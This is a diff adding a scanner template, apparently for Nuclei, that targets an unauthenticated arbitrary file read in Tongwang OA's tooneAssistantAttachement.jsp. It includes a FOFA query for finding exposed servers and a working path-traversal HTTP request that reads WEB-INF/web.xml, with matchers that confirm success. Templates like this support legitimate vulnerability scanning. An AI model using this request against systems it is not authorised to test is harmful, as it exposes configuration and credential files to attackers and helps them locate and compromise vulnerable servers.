@@ -1,0 +1,36 @@
+id: tongwangOA-tooneAssistantAttachement_jsp-File-reading
+
+info:
+  tags: tongwangOA-tooneAssistantAttachement_jsp-File-reading
+  name: 同望OA tooneAssistantAttachement.jsp 任意文件读取漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa: body="loginAction.struts?actionType=blockLogin"
+    同望OA tooneAssistantAttachement.jsp 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+
+
+
+http:
+  - raw:
+      - |
+        GET /jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<web-app>'
+          - '<context-param>'
+        condition: and
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
